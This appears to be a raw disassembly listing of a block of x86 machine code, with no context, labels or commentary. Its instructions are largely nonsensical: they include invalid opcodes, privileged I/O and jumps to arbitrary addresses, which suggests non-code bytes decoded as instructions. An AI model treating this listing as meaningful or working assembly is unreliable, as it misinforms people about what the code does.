  41b2a4:	xor    DWORD PTR [eax+0x437d7201],ebp
  41b2aa:	fild   DWORD PTR [edx]
  41b2ac:	mov    edx,0xdfb6e8e9
  41b2b1:	adc    BYTE PTR [edx-0x20],ch
  41b2b4:	aaa    
  41b2b5:	inc    ecx
  41b2b6:	pop    esp
  41b2b7:	inc    eax
  41b2b8:	xor    eax,0xdc228192
  41b2bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b2be:	imul   BYTE PTR [ebx+0x38]
  41b2c1:	cmp    DWORD PTR [ebp+0xca4ff12],eax
  41b2c7:	and    bh,BYTE PTR [ebx-0x6d]
  41b2ca:	jmp    0x41b2bb
  41b2cc:	repz std 
  41b2ce:	leave  
  41b2cf:	push   0x36ea5dc4
  41b2d4:	scas   eax,DWORD PTR es:[edi]
  41b2d5:	fs jmp 0x3196f0d4
  41b2db:	add    DWORD PTR [edx],0xfffffff6
  41b2de:	pop    esp
  41b2df:	mov    ch,0x5a
  41b2e1:	xor    edx,DWORD PTR ds:[ebx-0x4223228b]
  41b2e8:	mov    eax,ds:0x4492354a
  41b2ed:	imul   eax,DWORD PTR [ebp-0x55],0xffffff83
  41b2f1:	mov    esp,0x91c68b0
  41b2f6:	and    al,0x46
  41b2f8:	std    
  41b2f9:	scas   eax,DWORD PTR es:[edi]
  41b2fa:	add    ebx,DWORD PTR [esi-0x46]
  41b2fd:	(bad)  
  41b2fe:	pop    ds
  41b2ff:	or     BYTE PTR [edi+0x4],al
  41b302:	popa   
  41b303:	fwait
  41b304:	xchg   esp,eax
  41b305:	enter  0x6071,0xc0
  41b309:	test   al,0x7a
  41b30b:	loop   0x41b375
  41b30d:	mov    esp,0x4dd8eaf
  41b312:	push   es
  41b313:	push   0x7526ffc7
  41b318:	inc    esi
  41b319:	jns    0x41b2ff
  41b31b:	retf   
  41b31c:	outs   dx,DWORD PTR ds:[esi]
  41b31d:	xchg   ebx,eax
  41b31e:	fild   WORD PTR [ebx]
  41b320:	scas   al,BYTE PTR es:[edi]
  41b321:	xor    BYTE PTR [ecx+eiz*1+0x6396be01],ch
  41b328:	push   esp
  41b329:	add    eax,0x3445502c
  41b32e:	push   ds
  41b32f:	mov    ebx,0x38d5f450
  41b334:	int    0x64
  41b336:	sub    eax,0x246a2bf7
  41b33b:	add    ebp,DWORD PTR [ebx-0x4cf4807e]
  41b341:	stc    
  41b342:	adc    edx,ecx
  41b344:	out    dx,eax
  41b345:	jecxz  0x41b38a
  41b347:	lahf   
  41b348:	out    0xd7,al
  41b34a:	jne    0x41b37e
  41b34c:	in     eax,0xe2
  41b34e:	call   0x35f46b71
  41b353:	cmp    al,0x72
  41b355:	inc    eax
  41b356:	sbb    eax,DWORD PTR [esi]
  41b358:	call   0x52d8:0x48bd6717
  41b35f:	sbb    DWORD PTR [ecx-0xd],esp
  41b362:	div    BYTE PTR [esp+ecx*4+0x18ff11c6]
  41b369:	mov    al,0x1e
  41b36b:	dec    esp
  41b36c:	jp     0x41b3a5
  41b36e:	dec    eax
  41b36f:	jo     0x41b346
  41b371:	xlat   BYTE PTR ds:[ebx]
  41b372:	push   eax
  41b373:	ins    BYTE PTR es:[edi],dx
  41b374:	test   DWORD PTR [esi+0x5fa3bafa],esp
  41b37a:	sbb    DWORD PTR [eax],edi
  41b37c:	in     eax,dx
  41b37d:	loope  0x41b37d
  41b37f:	scas   al,BYTE PTR es:[edi]
  41b380:	imul   esi,edx,0xffffffb7
  41b383:	fs cld 
  41b385:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b386:	(bad)
  41b389:	push   0x14eda8ae
  41b38e:	out    dx,al
  41b38f:	mov    bl,0x9f
  41b391:	or     DWORD PTR [esi+0x70ddb151],esi
  41b397:	dec    eax
  41b398:	jl     0x41b394
  41b39a:	loopne 0x41b399
  41b39c:	popf   
  41b39d:	xor    eax,0xeb45a04a
  41b3a2:	je     0x41b3ec
  41b3a4:	push   ebp
  41b3a5:	add    eax,0x81e2f8df
  41b3aa:	jo     0x41b3a8
  41b3ac:	(bad)  
  41b3ad:	and    bl,BYTE PTR [ebx]
  41b3af:	ins    BYTE PTR es:[edi],dx
  41b3b0:	hlt    
  41b3b1:	and    cl,BYTE PTR [eax+ebx*2-0x7c581a2d]
  41b3b8:	xchg   esi,ecx
  41b3ba:	adc    eax,0xd5e93d91
  41b3bf:	js     0x41b3bf
  41b3c1:	mov    edx,0xb6973943
  41b3c6:	mov    bl,0x91
  41b3c8:	xchg   esi,eax
  41b3c9:	or     bl,BYTE PTR [eax+esi*4]
  41b3cc:	fdiv   QWORD PTR [ebx-0x7]
  41b3cf:	pop    esp
  41b3d0:	enter  0xa481,0x65
  41b3d4:	push   edi
  41b3d5:	je     0x41b3cc
  41b3d7:	push   es
  41b3d8:	xchg   edi,eax
  41b3d9:	sub    DWORD PTR ds:0xb50b033e,ecx
  41b3df:	sti    
  41b3e0:	adc    DWORD PTR [ebx+0x7a55aaac],esp
  41b3e6:	aad    0x2e
  41b3e8:	ret    
  41b3e9:	cmp    DWORD PTR [eax+0x663c2d1d],eax
  41b3ef:	std    
  41b3f0:	iret   
  41b3f1:	pop    ebx
  41b3f2:	outs   dx,BYTE PTR ds:[esi]
  41b3f3:	xchg   ebx,eax
  41b3f4:	bound  ecx,QWORD PTR [edi+0x46]
  41b3f7:	scas   al,BYTE PTR es:[edi]
  41b3f8:	or     dl,bl
  41b3fa:	ds test eax,0x22538f61
  41b400:	add    eax,0x9747c2d0
  41b405:	shl    BYTE PTR [esi-0x6184cd79],0x9c
  41b40c:	xchg   ecx,eax
  41b40d:	std    
  41b40e:	pushf  
  41b40f:	mov    ds:0x43db6ef4,eax
  41b414:	mov    ebx,0x1d7c0da0
  41b419:	mov    edx,0x149e68f7
  41b41e:	xor    eax,0xd8555c1b
  41b423:	cwde   
  41b424:	dec    ebp
  41b425:	cmp    al,0x23
  41b427:	or     esi,esp
  41b429:	jb     0x41b3af
  41b42b:	popf   
  41b42c:	fxch   st(4)
  41b42f:	pop    esp
  41b430:	mov    cs,ebp
  41b432:	inc    ebx
  41b433:	clc    
  41b434:	sub    eax,0x500b5492
  41b439:	out    dx,al
  41b43a:	aam    0xe7
  41b43c:	pop    edi
  41b43d:	stos   BYTE PTR es:[edi],al
  41b43e:	and    BYTE PTR [esi+0x51],0x63
  41b442:	(bad)  
  41b443:	jge    0x41b4a0
  41b445:	xchg   edx,eax
  41b446:	sub    ecx,ecx
  41b448:	dec    ebx
  41b449:	and    edx,edi
  41b44b:	push   esi
  41b44c:	stc    
  41b44d:	mov    esp,0xfa9fb163
  41b452:	jge    0x41b42f
  41b454:	mov    BYTE PTR [eax],bl
  41b456:	je     0x41b47e
  41b458:	cmp    esi,ebp
  41b45a:	adc    esi,edi
  41b45c:	jge    0x41b3ed
  41b45e:	iret   
  41b45f:	jge    0x41b440
  41b461:	pop    ebx
  41b462:	mov    al,dh
  41b464:	inc    esp
  41b465:	adc    al,0x5d
  41b467:	cmp    DWORD PTR [ebp-0x7e],0xa2ff8a84
  41b46e:	int    0xa9
  41b470:	(bad)  [edi+0x39f07e0e]
  41b476:	mov    eax,ds:0xdc799dd8
  41b47b:	pop    eax
  41b47c:	(bad)  
  41b47d:	shl    DWORD PTR [ebx+0x37],cl
  41b480:	mov    esi,0x67d00545
  41b485:	lods   eax,DWORD PTR ds:[esi]
  41b486:	mov    eax,ds:0xd332f258
  41b48b:	rcr    bl,1
  41b48d:	enter  0x8f50,0x8f
  41b491:	add    al,0xc1
  41b493:	xor    DWORD PTR [ebp-0x25e50069],0x3b
  41b49a:	icebp  
  41b49b:	push   edi
  41b49c:	or     BYTE PTR [ebx*4+0x7d661bad],0x27
  41b4a4:	lods   eax,DWORD PTR ds:[esi]
  41b4a5:	dec    eax
  41b4a6:	sbb    DWORD PTR [ebx+eiz*2],esi
  41b4a9:	(bad)  
  41b4aa:	mov    ds:0xb61c67fa,al
  41b4af:	add    BYTE PTR [ecx+0x15],ch
  41b4b2:	jmp    0x5ae6abc9
  41b4b7:	out    0x79,al
  41b4b9:	daa    
  41b4ba:	js     0x41b508
  41b4bc:	out    0x9f,eax
  41b4be:	aas    
  41b4bf:	ret    0x450a
  41b4c2:	inc    edx
  41b4c3:	xor    al,0xaa
  41b4c5:	out    0x55,al
  41b4c7:	jnp    0x41b4fd
  41b4c9:	fsub   DWORD PTR [ecx]
  41b4cb:	rol    BYTE PTR [eax-0xb],cl
  41b4ce:	sahf   
  41b4cf:	or     BYTE PTR [ecx+0x2554ce48],cl
  41b4d5:	xchg   ebx,eax
  41b4d6:	sahf   
  41b4d7:	mov    BYTE PTR [ebx+0x6bbae9a6],ch
  41b4dd:	cmp    DWORD PTR [ebp+0x69],ebx
  41b4e0:	ja     0x41b4ff
  41b4e2:	loop   0x41b544
  41b4e4:	dec    ebx
  41b4e5:	jo     0x41b481
  41b4e7:	fadd   DWORD PTR [edx+edi*4]
  41b4ea:	je     0x41b4fd
  41b4ec:	jns    0x41b4d1
  41b4ee:	loopne 0x41b47e
  41b4f0:	xchg   ecx,eax
  41b4f1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b4f2:	or     esi,0x908cc7ac
  41b4f8:	cmc    
  41b4f9:	sbb    BYTE PTR [ebp-0xa],bl
  41b4fc:	dec    edi
  41b4fd:	pop    ss
  41b4fe:	pop    es
  41b4ff:	jge    0x41b543
  41b501:	int3   
  41b502:	shl    DWORD PTR [edx-0x32],0xa4
  41b506:	aam    0xba
  41b508:	sub    ebx,DWORD PTR [esi]
  41b50a:	shr    DWORD PTR [eax-0x71],0xce
  41b50e:	or     ch,BYTE PTR [ecx+ebx*8-0x44631994]
  41b515:	jl     0x41b4fc
  41b517:	mov    ebp,0x39809222
  41b51c:	inc    ebx
  41b51d:	add    al,0x28
  41b51f:	div    ah
  41b521:	push   ebx
  41b522:	sub    cl,BYTE PTR [eax]
  41b524:	jbe    0x41b56a
  41b526:	mov    bl,0x63
  41b528:	adc    cl,cl
  41b52a:	in     eax,dx
  41b52b:	dec    edi
  41b52c:	adc    BYTE PTR [eax],cl
  41b52e:	out    0xb,al
  41b530:	adc    DWORD PTR [ebx+0x25],edx
  41b533:	retf   0x2007
  41b536:	cs addr16 test al,0x3d
  41b53a:	lahf   
  41b53b:	add    ecx,edi
  41b53d:	jp     0x41b52b
  41b53f:	lods   eax,DWORD PTR ds:[esi]
  41b540:	push   es
  41b541:	mov    WORD PTR [ebp-0x1ad158f6],ss
  41b547:	in     al,dx
  41b548:	and    eax,DWORD PTR [esi]
  41b54a:	push   edi
  41b54b:	or     ebp,edx
  41b54d:	add    eax,0xfca8eb8c
  41b552:	jp     0x41b4e2
  41b554:	test   eax,0xa6d4304a
  41b559:	dec    esp
  41b55a:	mov    dl,dl
  41b55c:	shl    BYTE PTR [ebx],0x7b
  41b55f:	sar    BYTE PTR [ebx-0x7a5faf35],1
  41b565:	push   esp
  41b566:	ins    DWORD PTR es:[edi],dx
  41b567:	lea    esi,[ebp+0xd]
  41b56a:	lock rcl bh,0xc3
  41b56e:	sub    edi,DWORD PTR [ebx]
  41b570:	stc    
  41b571:	cld    
  41b572:	dec    ebx
  41b573:	pop    ebx
  41b574:	inc    esi
  41b575:	into   
  41b576:	(bad)  
  41b577:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b578:	(bad)  
  41b579:	int3   
  41b57a:	in     al,dx
  41b57b:	push   ebx
  41b57c:	inc    eax
  41b57d:	fcmovb st,st(1)
  41b57f:	out    dx,eax
  41b580:	test   eax,0x3410309d
  41b585:	leave  
  41b586:	pushaw 
  41b588:	shld   ebp,ebx,cl
  41b58b:	dec    edi
  41b58c:	xchg   ecx,eax
  41b58d:	inc    esp
  41b58e:	mov    ecx,0xbe441f07
  41b593:	stos   BYTE PTR es:[edi],al
  41b594:	das    
  41b595:	and    bh,bh
  41b597:	test   al,0x7d
  41b599:	retf   0xda0a
  41b59c:	retf   
  41b59d:	scas   eax,DWORD PTR es:[edi]
  41b59e:	xchg   esi,eax
  41b59f:	int3   
  41b5a0:	or     edi,DWORD PTR [ebp+0x57]
  41b5a3:	push   ss
  41b5a4:	ret    
  41b5a5:	jmp    0x4478c0c9
  41b5aa:	inc    ecx
  41b5ab:	jge    0x41b5ef
  41b5ad:	inc    ebx
  41b5ae:	out    dx,eax
  41b5af:	push   esp
  41b5b0:	call   0x92e454ae
  41b5b5:	ins    BYTE PTR es:[edi],dx
  41b5b6:	scas   eax,DWORD PTR es:[edi]
  41b5b7:	out    0xeb,al
  41b5b9:	into   
  41b5ba:	sub    edi,DWORD PTR [esi]
  41b5bc:	or     eax,esp
  41b5be:	data16 sbb al,0xe3
  41b5c1:	xchg   edi,eax
  41b5c2:	mov    edx,0xed54086e
  41b5c7:	dec    esp
  41b5c8:	lds    ecx,FWORD PTR [ebx+0x4]
  41b5cb:	ret    0x920a
  41b5ce:	je     0x41b5aa
  41b5d0:	scas   eax,DWORD PTR es:[edi]
  41b5d1:	push   0xffffff92
  41b5d3:	push   edi
  41b5d4:	sahf   
  41b5d5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b5d6:	push   es
  41b5d7:	sbb    ebp,edx
  41b5d9:	xor    esi,DWORD PTR [edi+ebx*8]
  41b5dc:	or     al,0x83
  41b5de:	pop    edi
  41b5df:	jge    0x41b64d
  41b5e1:	je     0x41b568
  41b5e3:	sub    ch,BYTE PTR [esi+0x59]
  41b5e6:	xchg   ebx,eax
  41b5e7:	sub    DWORD PTR [edx],edx
  41b5e9:	push   cs
  41b5ea:	(bad)  
  41b5eb:	mov    eax,0xe5d96087
  41b5f0:	adc    bl,BYTE PTR [esi+0x2a]
  41b5f3:	jge    0x41b606
  41b5f5:	cdq    
  41b5f6:	in     al,dx
  41b5f7:	jmp    0x3b7d:0xe9df6081
  41b5fe:	jg     0x41b640
  41b600:	xor    al,0x54
  41b602:	loop   0x41b670
  41b604:	cs dec ecx
  41b606:	mov    eax,0x2661a449
  41b60b:	dec    edi
  41b60c:	inc    ebp
  41b60d:	leave  
  41b60e:	(bad)  
  41b610:	dec    esp
  41b611:	mov    ds:0xe986a80e,eax
  41b616:	popf   
  41b617:	jp     0x41b5e7
  41b619:	sti    
  41b61a:	cwde   
  41b61b:	push   ebx
  41b61c:	xchg   edi,eax
  41b61d:	arpl   WORD PTR [ecx],ax
  41b61f:	push   edi
  41b620:	dec    edi
  41b621:	cmp    BYTE PTR ds:[ebp+eax*4+0x36],cl
  41b626:	adc    edi,DWORD PTR [ecx+0x5d]
  41b629:	dec    esp
  41b62a:	fwait
  41b62b:	ins    BYTE PTR es:[edi],dx
  41b62c:	push   eax
  41b62d:	dec    ecx
  41b62e:	mov    bh,0x95
  41b630:	or     bh,BYTE PTR [edx+0x6b]
  41b633:	fist   DWORD PTR [esi+0x353c2295]
  41b639:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b63a:	js     0x41b69f
  41b63c:	test   BYTE PTR [esi+0x76],bl
  41b63f:	mov    edi,0x1be0d221
  41b644:	adc    BYTE PTR [edi+0x15],ch
  41b647:	stos   DWORD PTR es:[edi],eax
  41b648:	mov    ch,0xa1
  41b64a:	add    al,0x1d
  41b64c:	fmul   QWORD PTR [ebx+0x79]
  41b64f:	(bad)  
  41b651:	daa    
  41b652:	ret    0x3653
  41b655:	push   es
  41b656:	cli    
  41b657:	arpl   WORD PTR [esi+0x5b],si
  41b65a:	add    DWORD PTR [ebx],0x54
  41b65d:	dec    eax
  41b65e:	mov    bh,0xe8
  41b660:	xchg   ebx,eax
  41b661:	adc    eax,0x4c130271
  41b666:	adc    dh,BYTE PTR [edi]
  41b668:	and    edx,DWORD PTR [ebx+0x48]
  41b66b:	rol    BYTE PTR [edx+eax*1+0x61],1
  41b66f:	(bad)  
  41b671:	(bad)  
  41b673:	int    0xdd
  41b675:	sbb    ch,BYTE PTR [edi+ebp*2+0x69249785]
  41b67c:	jmp    0x41b6bc
  41b67e:	sbb    bl,ch
  41b680:	(bad)  
  41b681:	mov    ch,0x5a
  41b683:	or     esi,DWORD PTR [ecx+ebp*2+0x69]
  41b687:	rol    DWORD PTR [ebx],1
  41b689:	ret    
  41b68a:	stos   BYTE PTR es:[edi],al
  41b68b:	inc    ebp
  41b68c:	mov    edi,0x271f4aa7
  41b691:	out    0x7b,al
  41b693:	out    dx,al
  41b694:	and    eax,DWORD PTR [edi-0xd92104b]
  41b69a:	and    eax,0x314fbe7b
  41b69f:	xor    DWORD PTR [ecx+0x4545e50],esp
  41b6a5:	in     eax,dx
  41b6a6:	adc    dh,BYTE PTR [esi-0x7eab2d76]
  41b6ac:	mov    DWORD PTR [ebp-0x7cebfb09],esi
  41b6b2:	cmp    edi,edx
  41b6b4:	fiadd  WORD PTR [ebp-0x546391ef]
  41b6ba:	aas    
  41b6bb:	int3   
  41b6bc:	mov    eax,ds:0x763db9e1
  41b6c1:	in     al,0x3f
  41b6c3:	add    DWORD PTR [edx-0x3b],0xffffffaa
  41b6c7:	jnp    0x41b67b
  41b6c9:	enter  0x1eb,0xe6
  41b6cd:	or     al,0xc4
  41b6cf:	mov    ch,0x5d
  41b6d1:	jl     0x41b6cb
  41b6d3:	fcmovnbe st,st(2)
  41b6d5:	in     eax,dx
  41b6d6:	ror    esp,1
  41b6d8:	lea    ebx,[ecx]
  41b6da:	je     0x41b6f5
  41b6dc:	dec    ebx
  41b6dd:	sbb    eax,0x217590db
  41b6e2:	or     al,0x98
  41b6e4:	adc    DWORD PTR [ebp+0x6778ec1],esp
  41b6ea:	mov    al,0xb
  41b6ec:	xor    ebx,esp
  41b6ee:	cmp    edi,DWORD PTR [eax-0x5fbd09bb]
  41b6f4:	adc    BYTE PTR [esi-0x77],cl
  41b6f7:	jmp    0x9ee9328b
  41b6fc:	sub    DWORD PTR [bx+si],edx
  41b6ff:	mov    BYTE PTR [esp+edx*2],al
  41b702:	scas   eax,DWORD PTR es:[edi]
  41b703:	xchg   ebx,eax
  41b704:	outs   dx,DWORD PTR ds:[esi]
  41b705:	sub    ah,0x2d
  41b708:	xlat   BYTE PTR ds:[ebx]
  41b709:	lahf   
  41b70a:	add    ecx,DWORD PTR [eax-0x1b]
  41b70d:	inc    eax
  41b70e:	adc    al,BYTE PTR [ecx+0x5c]
  41b711:	push   edi
  41b712:	jg     0x41b6e2
  41b714:	hlt    
  41b715:	pushf  
  41b716:	outs   dx,DWORD PTR ds:[esi]
  41b717:	ds jge 0x41b70e
  41b71a:	outs   dx,DWORD PTR ds:[esi]
  41b71b:	pop    esi
  41b71c:	mov    ebx,0x6dd12676
  41b721:	or     DWORD PTR [ebx],0x55d81c6b
  41b727:	sub    al,0x99
  41b729:	jno    0x41b72a
  41b72b:	repnz mov ah,0x62
  41b72e:	popf   
  41b72f:	xor    BYTE PTR [eax+0x266092cb],bl
  41b735:	outs   dx,DWORD PTR ds:[esi]
  41b736:	shl    DWORD PTR [ebp-0x3f],1
  41b739:	aad    0x29
  41b73b:	sbb    BYTE PTR [ecx+0x35],dl
  41b73e:	xor    BYTE PTR [ebx+0x78136a2a],ch
  41b744:	mov    eax,ds:0x99b805c6
  41b749:	sbb    BYTE PTR [ebx-0x7f],cl
  41b74c:	mov    ch,0x56
  41b74e:	repnz xchg esp,eax
  41b750:	(bad)  
  41b751:	cmc    
  41b752:	or     DWORD PTR ds:[esi],edx
  41b755:	lahf   
  41b756:	mov    ah,0xfe
  41b758:	call   FWORD PTR [edi]
  41b75a:	xor    BYTE PTR [eax+0x75484330],al
  41b760:	and    BYTE PTR [ebp-0x1c],ah
  41b763:	jns    0x41b7a7
  41b765:	(bad)  
  41b766:	sahf   
  41b767:	mov    eax,ds:0x60fced91
  41b76c:	mov    cs,WORD PTR [edi+0x58]
  41b76f:	dec    edi
  41b770:	mov    gs,WORD PTR [esi+0x207f4305]
  41b776:	cli    
  41b777:	mov    ?,WORD PTR [ebx]
  41b779:	mov    al,BYTE PTR [esi+0x6e2271ea]
  41b77f:	jle    0x41b70f
  41b781:	js     0x41b74a
  41b783:	aad    0xc
  41b785:	jle    0x41b79a
  41b787:	sub    BYTE PTR [ecx-0x630f3d83],bh
  41b78d:	adc    esp,DWORD PTR [edi-0x12dd1396]
  41b793:	xor    dl,dl
  41b795:	call   DWORD PTR [ebx-0x16]
  41b798:	push   ds
  41b799:	sub    edx,edx
  41b79b:	mov    ecx,ebx
  41b79d:	(bad)  
  41b79e:	or     eax,0xdd16617d
  41b7a3:	sub    eax,0x9e2d1339
  41b7a8:	sbb    BYTE PTR [eax],cl
  41b7aa:	sub    edi,esp
  41b7ac:	xor    ebp,DWORD PTR [ebp+0x1d]
  41b7af:	fwait
  41b7b0:	push   0x1bc01ce6
  41b7b5:	inc    eax
  41b7b6:	jmp    0x41b80f
  41b7b8:	mov    esp,0x4ba35175
  41b7bd:	or     al,0xbf
  41b7bf:	test   eax,0x1311779e
  41b7c4:	adc    eax,0xba0b382f
  41b7c9:	jo     0x41b795
  41b7cb:	jb     0x41b7c2
  41b7cd:	cld    
  41b7ce:	mov    cl,ch
  41b7d0:	push   ecx
  41b7d1:	pusha  
  41b7d2:	inc    eax
  41b7d3:	out    0x11,eax
  41b7d5:	adc    BYTE PTR [edx],ch
  41b7d7:	cmp    al,0x28
  41b7d9:	lods   al,BYTE PTR ds:[esi]
  41b7da:	icebp  
  41b7db:	icebp  
  41b7dc:	lahf   
  41b7dd:	pop    esp
  41b7de:	or     eax,0x5ad5c035
  41b7e3:	adc    dl,bl
  41b7e5:	in     al,dx
  41b7e6:	es pushf 
  41b7e8:	sub    BYTE PTR [esi-0x11de1204],ch
  41b7ee:	pusha  
  41b7ef:	pcmpgtd mm0,mm1
  41b7f2:	xor    eax,DWORD PTR [ecx-0x38197c44]
  41b7f8:	out    0x70,eax
  41b7fa:	mov    al,0x56
  41b7fc:	sub    BYTE PTR [ebx+0x60],dl
  41b7ff:	mov    DWORD PTR [edx],eax
  41b801:	in     al,0x75
  41b803:	pop    edi
  41b804:	je     0x41b7d8
  41b806:	retf   0xfd5a
  41b809:	jmp    0xfc90:0xc5ce0ca7
  41b810:	shl    DWORD PTR [ebx+0x61],1
  41b813:	lea    esp,[eax]
  41b815:	fisub  DWORD PTR [ebp+0x399ed206]
  41b81b:	add    ebx,ebx
  41b81d:	in     al,dx
  41b81e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b81f:	ud1    edx,ebx
  41b822:	retf   
  41b823:	cld    
  41b824:	inc    esi
  41b825:	lods   al,BYTE PTR ds:[esi]
  41b826:	ror    BYTE PTR [ecx+eax*1-0x2f],0x5f
  41b82b:	jp     0x41b888
  41b82d:	mov    bh,0xe4
  41b82f:	xchg   edi,eax
  41b830:	(bad)  
  41b832:	sbb    edx,DWORD PTR [esi+edi*8]
  41b835:	or     DWORD PTR [ebx],0x8009dbe6
  41b83b:	ss xchg bh,bh
  41b83e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b83f:	jo     0x41b85b
  41b841:	loope  0x41b895
  41b843:	pusha  
  41b844:	xor    ebx,esi
  41b846:	add    DWORD PTR [edi-0x6c884572],0xc0c08635
  41b850:	and    ch,ah
  41b852:	mov    ds:0xc4fc15ab,al
  41b857:	loop   0x41b809
  41b859:	ret    
  41b85a:	(bad)  
  41b85b:	shl    DWORD PTR cs:[eax-0x60],1
  41b85f:	aad    0xfc
  41b861:	adc    edx,edi
  41b863:	xchg   esi,eax
  41b864:	cmp    dl,dl
  41b866:	adc    eax,0xf92ab9ea
  41b86b:	cmp    ecx,ebp
  41b86d:	lods   eax,DWORD PTR ds:[esi]
  41b86e:	or     DWORD PTR [ebp-0x36],esp
  41b871:	mov    BYTE PTR [edi-0x78fcbaf6],0x68
  41b878:	push   ds
  41b879:	stc    
  41b87a:	fidiv  WORD PTR [esi+ecx*2+0x62]
  41b87e:	or     DWORD PTR [eax+eiz*4],0x472146ed
  41b885:	add    al,0xde
  41b887:	and    al,0x81
  41b889:	fs xchg esi,eax
  41b88b:	mov    eax,0x13748522
  41b890:	mov    ebx,0x743335c1
  41b895:	(bad)  
  41b896:	in     eax,0xd8
  41b898:	pop    eax
  41b899:	cmc    
  41b89a:	or     al,BYTE PTR [ebx+0x7c94ff4b]
  41b8a0:	cmp    edx,ecx
  41b8a2:	adc    al,0x16
  41b8a4:	and    al,0xb3
  41b8a6:	inc    ecx
  41b8a7:	pop    es
  41b8a8:	pop    ds
  41b8a9:	add    bl,BYTE PTR [ebx]
  41b8ab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b8ac:	xor    BYTE PTR [ecx+0x7a537701],0x4e
  41b8b3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b8b4:	leave  
  41b8b5:	mov    ch,0x6e
  41b8b7:	or     BYTE PTR [ebp+edi*4-0x58],0xeb
  41b8bc:	mov    ecx,DWORD PTR [ecx]
  41b8be:	rcr    bl,0x4c
  41b8c1:	sbb    eax,0x4259aece
  41b8c6:	fld    QWORD PTR [edi+0x6a425727]
  41b8cc:	xor    cl,BYTE PTR [ecx+ecx*8]
  41b8cf:	add    bl,BYTE PTR [ebp-0x6d]
  41b8d2:	sti    
  41b8d3:	scas   al,BYTE PTR es:[edi]
  41b8d4:	xlat   BYTE PTR ds:[ebx]
  41b8d5:	jp     0x41b932
  41b8d7:	sbb    al,0x6d
  41b8d9:	xchg   BYTE PTR [edx-0x67],al
  41b8dc:	and    eax,0x29f2799
  41b8e1:	cmp    ch,ah
  41b8e3:	jp     0x41b8d7
  41b8e5:	pop    esi
  41b8e6:	xchg   ebx,eax
  41b8e7:	sbb    BYTE PTR [edi-0x54],bl
  41b8ea:	scas   eax,DWORD PTR es:[edi]
  41b8eb:	aas    
  41b8ec:	int    0xc6
  41b8ee:	cdq    
  41b8ef:	mov    ebp,0x92342316
  41b8f4:	jne    0x41b93f
  41b8f6:	inc    edx
  41b8f7:	sub    al,0x64
  41b8f9:	and    ch,BYTE PTR [ecx+eax*2-0x5ce4694]
  41b900:	dec    ebx
  41b901:	xor    al,0xf5
  41b903:	loopne 0x41b8f7
  41b905:	dec    edi
  41b906:	and    eax,0x12376c7f
  41b90b:	stos   DWORD PTR es:[edi],eax
  41b90c:	push   es
  41b90d:	adc    eax,0x8e8023e7
  41b912:	stos   DWORD PTR es:[edi],eax
  41b913:	pusha  
  41b914:	push   edi
  41b915:	(bad)  
  41b917:	call   0xa82:0x275d665
  41b91e:	hlt    
  41b91f:	mov    esi,0x59aab8c7
  41b924:	in     eax,0xd7
  41b926:	jb     0x41b931
  41b928:	int    0xcb
  41b92a:	shl    DWORD PTR [esi+0xc],1
  41b92d:	inc    esi
  41b92e:	sar    DWORD PTR [esi-0x6d],cl
  41b931:	test   BYTE PTR es:[ebp+0xfc0ca17],cl
  41b938:	addr16 mov eax,ds:0x84e
  41b93c:	xlat   BYTE PTR ds:[ebx]
  41b93d:	add    DWORD PTR [ebp+0x43],ecx
  41b940:	out    0x85,al
  41b942:	popf   
  41b943:	fmul   st,st(4)
  41b945:	jmp    0x41b95d
  41b947:	push   ss
  41b948:	dec    ebp
  41b949:	test   DWORD PTR [esi+0x48e8c20b],edi
  41b94f:	mov    WORD PTR [edx],es
  41b951:	sahf   
  41b952:	loopne 0x41b925
  41b954:	xchg   esp,eax
  41b955:	ja     0x41b921
  41b957:	sub    eax,0x6823bd6a
  41b95c:	shl    BYTE PTR [esi+0xd],1
  41b95f:	cmc    
  41b960:	dec    eax
  41b961:	cli    
  41b962:	mov    ebp,ebx
  41b964:	fisttp QWORD PTR [eax+0x397d54e2]
  41b96a:	sar    al,cl
  41b96c:	aaa    
  41b96d:	(bad)  
  41b96e:	xor    eax,0x46005a68
  41b973:	scas   eax,DWORD PTR es:[edi]
  41b974:	in     eax,dx
  41b975:	idiv   bl
  41b977:	inc    esi
  41b978:	sub    bh,dh
  41b97a:	lea    ebp,[esi]
  41b97c:	das    
  41b97d:	das    
  41b97e:	rcl    DWORD PTR [ecx],cl
  41b980:	scas   eax,DWORD PTR es:[edi]
  41b981:	rcl    DWORD PTR [esi-0x7e82627c],0xbd
  41b988:	pop    edx
  41b989:	stos   DWORD PTR es:[edi],eax
  41b98a:	pop    ebx
  41b98b:	out    0x55,eax
  41b98d:	sbb    al,0x9e
  41b98f:	fwait
  41b990:	les    esp,FWORD PTR [esi]
  41b992:	mov    BYTE PTR [ecx+0x4a],ah
  41b995:	jne    0x41b9bf
  41b997:	scas   al,BYTE PTR es:[edi]
  41b998:	pop    es
  41b999:	iret   
  41b99a:	les    ebp,FWORD PTR [edi+0x58ff5070]
  41b9a0:	jp     0x41ba05
  41b9a2:	pushf  
  41b9a3:	(bad)  
  41b9a4:	add    eax,0x83f332de
  41b9a9:	jo     0x41b978
  41b9ab:	in     al,dx
  41b9ac:	ds leave 
  41b9ae:	mov    ?,WORD PTR [edi-0x37c1bdce]
  41b9b4:	sub    DWORD PTR [ebx],ecx
  41b9b6:	jno    0x41b9a1
  41b9b8:	lea    esp,[ebp+0x37]
  41b9bb:	(bad)  
  41b9bc:	clc    
  41b9bd:	idiv   DWORD PTR [edx-0x43e71bd5]
  41b9c3:	repnz inc esp
  41b9c5:	es mov dh,0x5f
  41b9c8:	dec    esi
  41b9c9:	xchg   edi,eax
  41b9ca:	popf   
  41b9cb:	mov    eax,ds:0xab40ccc5
  41b9d0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b9d1:	frstor [ecx+0x656904d]
  41b9d7:	dec    ebx
  41b9d8:	cmp    eax,0x376ccf7f
  41b9dd:	fidivr DWORD PTR [ecx]
  41b9df:	call   0x18c1abfa
  41b9e4:	push   esp
  41b9e5:	mov    ds:0xf7fca6f2,al
